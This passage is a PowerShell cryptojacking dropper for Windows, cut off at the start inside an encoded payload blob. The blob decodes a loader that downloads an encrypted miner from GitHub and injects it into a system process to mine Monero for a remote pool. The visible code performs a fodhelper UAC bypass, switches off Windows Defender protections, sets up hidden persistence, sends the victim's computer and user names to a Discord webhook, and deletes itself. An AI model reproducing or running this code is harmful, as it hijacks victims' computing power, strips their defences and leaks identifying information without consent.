QkhRVlFoT0Q4SkRCRWdER3NER0ZoZVZsQVpiUXc5Q0FJQ1dGWnJUbGxFQ1JOSlAyMVpjMFZEVWtWVWEwVlpFVkJLUUZBV0pITU5Cd0JGU1dzTEhFWVNVVTFCS0NJZ0RWRXZYbjVyUlZrUkVoTVVGVzFaYzBVaUFCY1ZNa3M2WGtKS0hFVmhXV05KUXhvQkJtZEZTUjBTRzExYk9WQWdEVkZiWG41clJWa1JFaE1VRlcxWmMwVUtGRTFWSEJjUVJWZGpSbG91SENBV0xoY0lHemtjVVVGYkhWeGxZVmt4QkJBWEpCQXZGMVVSV2xkR0dXMEtPMWRQVWdvQlAwVU9HQnNUVHhVR0VEOEpTd0lNWFhCRkMxUkdSa1piYlZzRU5TNVNEUkVxQVJ4REVsVlZYQ0VjTjBkWVVoaCthMFZaRVJJVEZCVnRXWE5GQlIwWFhDSUxEUkZiQVJRSWJVbG9SUXBBUlVockN3b0tFbG9HSG1aUWN4NXBVa1ZVYTBWWkVSSVRGQlZ0V1hORlF4c0xBR3NXRmdNU0RoUkdKVFkxQTBOWlJSMTVSVk1SQmdNUFAyMVpjMFZEVWtWVWEwVlpFUklURkJVNEVEMFJRd1FFVkhaRk8xaEdjRnRiT3h3aEVRWUFTeUFrTURCZlJnQUdIVDFWY3hZTVFFVmZhMVJMR0FrNUZCVnRXWE5GUTFKRlZHdEZXUkVTRTBGY0l3MXpGd2RTV0ZRSkRBMXlYVjFDVUQ4Tk5oZE5KZ29oQWdzTkFnQWJSQmx0Q2p4WFExbEZSWDFNUWpzU0V4UVZiVmx6UlVOU1JWUnJSVmtSUjFwYVFXMEpJVVZlVWljZFB5WVdYMFJXUmtFb0MzMHhEQ2NzR2o5V1N4bENIeFJHSWt0elRrTkFWVjF3YjFrUkVoTVVGVzFaYzBWRFVrVlVhMFViU0VaV2IyaHRIVElSQWxKWVZDVUFEaEZRU2tCUUZnczNPRmg0UlZSclJWa1JFaE1VRlcxWmMwVkRVaVFHT1FRQUgzRmNSRXhsQ1g5RlN4c0xBR0lWQ3gwU1YxVkJMRlZ6VlU5U1RSMGxFVkJEVmhvUFAyMVpjMFZEVWtWVWEwVlpFUklURkJVa0gzdEVOQUFNQUM0MUMxNVJWa2RHQUJ3K0NoRUxUUVFpU3hGaEhoTmFVRHBaR2dzWEloRUdZd2NZUWxkeVVGRS9Wd2NLS2h3UlFuOU5VQkVaRXh4WkloYzBUQlVUVEZockFSaEZVeDhVUnlsVmN3b1dCa1VEWWt4WlNoSjRYVmtoVVNNTVNrbEZCaTRSREVOY0V4WmlIVFJ6RmdZUlJWWnJUbGxZQUJNZkZXOVpOUVFLSGdBUWFWNVpURGdURkJWdFdYTkZRMUpGVkdzWWN4RVNFeFFWYlZselJVTlNSVGQ5VVZsU1Jrc1VDRzBYTmhKRE1WTkFZMHhDRVZGSFRCc3JXVzVGVXdwVVJIdFZTUUVKT1JRVmJWbHpSVU5TUlZSclJSQlhHaEp6VURrdE94Y0dFd0UzSkFzTlZFcEhIRVVrVnpzeFQxSVhFUzFGR2tWS0doMFZObGtZREE4ZVRRUWlURUlSUUZaQVFEOFhjMGNrRnhFZ0l4Y2NVRlp3VzFzNUhDc1JReFFFSFNjQUhSTUpFMGsvYlZselJVTlNSVlJyUlZrUlVVZE1HejhRSTBWZVVnY1ZPQUE0VlZaQkdtRWlNRDBSVlVaTlhXdE9XUmxlWEZwU1pCd2pYbWxTUlZSclJWa1JFaE1VRlcwUU5VMUNJUUFBSHcwTFZGTlhkMW9qRFRZZEYxb1ZIV1VOTFIwU1FWRlRiUm9uSFVwYlJROXJMaEJkWGh0RVhHUkNjeGNHQmhBR0pVVmJZbGRIWUYwL0hESUJJQjBMQUM0ZERSRlVVbDFaS0IxeFhrTVBiMVJyUlZrUkVoTVVGVzFaY3d3RldqY1JPQkFVVkdaYlJsQXNIWHNWQ2x3TklHSkZSQXdTQTB4ekN6OFZJeVUwSTExckhsbDZXMTlZSFQwUWVsNURBQUFBUGhjWEVSQmhVVVk0RkRZeEN3QUFGUzlGSDFCYlgxRlJiMEp6R0dsU1JWUnJSVmtSRWhNVUZXMHRPeGNHRXdGYUdBa2NWRUliQWdWOVNYcGVhVkpGVkd0RldSRVNFeFFWYlF3NkN4ZFNBQmR3YjFrUkVoTVVGVzFaYzBWRFVpSVJQeUFCV0Vad1cxRW9LU0VLQUJjV0IyTVZFQjlhWXhnVklnd25SUVlSVEU5QlJWa1JFaE1VRlcxWmMwVkRHd05jTGdaWkVBOFRCZ0IwVUhNZVF6RUpHemdBTVZCY1YxaFFaUWs2U3dzbVRFOXJKaFZlUVZaOFZDTWRQd0JMQWd4YUl6VlFDaEpCVVVFNEN6MUZRUmNkSFQ4QUhRc1FFeDhWS0Jwb1JSNTRSVlJyUlZrUkVoTVVGVzFaSVFBWEJ4Y2FhMGMyZWhKU1dGdzdISEZlYVZKRlZHdEZXUkVTVGhSV0xBMHdEVXMzSFJjdUZRMVlYVjBVVURWUWN4NURPUXdZSjAwSldCc0lGRWNvRFNZWERWSkhFVE1HUXhFUUV4OFZLQUY5S0FZQkZoVXNBRUlSVHprVUZXMVpMbTlEVWtWVU9CRVlSVnRRRkVNaUVEZEZLQnNKR0dNMU1CRkNXaDBWTm5OelJVTlNSVlJyUlMxVVFGNWRXeXdOTmpVUkhRWVJPQlpSUVZzZFhHVmhXV05NV0hoRlZHdEZXUkVTRTBCSE5Ga29SU0FlQ2djdUxSaGZWbDlSSFQwUWZRMDNXMTVVTmtVYVVFWlFYQlUyV1M1dlExSkZWR3RGV1JGR1FVMFZObGtRQ1F3QkFEd3FDeDFkVnh0RVhHTVJBMHhZVWhoVUtBUU5VbG9UVHhVd2MzTkZRMUlZZmpZPScpLCRrZXkpKSkKQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRzcmMKJHdjPU5ldy1PYmplY3QgTmV0LldlYkNsaWVudAokZW5jPSR3Yy5Eb3dubG9hZERhdGEoKFggJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDIxaGNtOTZNVEl6TDBadmIzUmlZV3hzTDIxaGFXNHZlRzF5YVdkZlpXNWpMbUpwYmc9PScpKQokZGVjPVhvckRlYyAkZW5jICRrZXkKJGhvc3RFeGU9IiRlbnY6V0lORElSXFN5c3RlbTMyXFNlYXJjaFByb3RvY29sSG9zdC5leGUiCiRhcmdzPSItbyAiICsgKFggJ2NHOXZiQzVvWVhOb2RtRjFiSFF1Y0hKdk9qUTBNdz09JykgKyAiIC11ICIgKyAoWCAnTkRZM1p6RnRaV2w2Um1Vek1VZDZSazFITjNodmVUTjVlRlJvUnpVMmNEZE9UbnAxZEV0bVpqZFpVR2t4UkdGa1FXUnlhMWt5ZUV4cU9YcE1WMnBhVG0wMGFHWlliMFl5ZFhoaE5sQm5Ta05YVVdNMlVWVm9OalJPUjNCWVJVdz0nKSArICIgLWsgLS10bHMgLS1kb25hdGUtbGV2ZWwgMCAtLW1heC1jcHUtdXNhZ2UgMTAgLS1jb2luIG1vbmVybyAtLWFsZ28gcngvMCIKJGN3ZD0iJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcTmV0d29ya1NlcnZpY2VcY2FjaGUiCmlmKCEoVGVzdC1QYXRoICRjd2QpKXtOZXctSXRlbSAtUGF0aCAkY3dkIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlfE91dC1OdWxsfQpbSW1hZ2VMb2FkZXJdOjpHbygkZGVjLCRob3N0RXhlLCRhcmdzLCRjd2QpfE91dC1OdWxs'
$minerScript=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
[System.IO.File]::WriteAllText("$_s\miner.ps1",$minerScript)
}

function Invoke-UACBypass{
$c=[Convert]::FromBase64String('cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiU3RhcnQtU2xlZXAgMzsgUmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MnIC1SZWN1cnNlIC1Gb3JjZSI=')
$h=[Convert]::FromBase64String('Zm9kaGVscGVyLmV4ZQ==')
$r=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Classes\ms-settings\Shell\Open\Command")
$r.SetValue('',$c)
$r.SetValue('DelegateExecute','')
Start-Process $h
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}

function Invoke-DefenseEvasion{
try{
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -ExclusionProcess "SearchProtocolHost.exe" -ErrorAction SilentlyContinue
}catch{}
}

function Enable-HugePages{
try{
cmd /c "reg add HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management /v LargeSystemCache /t REG_DWORD /d 1 /f" 2>$null
}catch{}
}

function Disable-Sleep{
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
}

function Start-RandomDelay{
$delay = Get-Random -Minimum 30 -Maximum 120
Start-Sleep $delay
}

if(![Environment]::Is64BitOperatingSystem){return}
if($env:PROCESSOR_ARCHITECTURE-ne'AMD64'){return}

Start-RandomDelay

try{Invoke-UACBypass}catch{}
try{Invoke-DefenseEvasion}catch{}
try{Enable-HugePages}catch{}
try{Disable-Sleep}catch{}
if(!(Test-Path $_s)){New-Item -Path $_s -ItemType Directory -Force|Out-Null}
Set-ItemProperty $_s -Name Attributes -Value 'Hidden,System' -ErrorAction SilentlyContinue
try{Write-StealthWatchdog}catch{}
try{Write-SelfHealScript}catch{}
try{Set-Persistence}catch{}
try{Set-DeepPersistence}catch{}
try{Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`"" -WindowStyle Hidden}catch{}
$minerResult=try{Launch-Miner}catch{($_.Exception.Message)}

Send-DiscordWebhook "New deployment: $env:COMPUTERNAME | $env:USERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | result: $minerResult"

try{
Remove-Item -Path $MyInvocation.MyCommand.Source -Force -ErrorAction SilentlyContinue
}catch{}
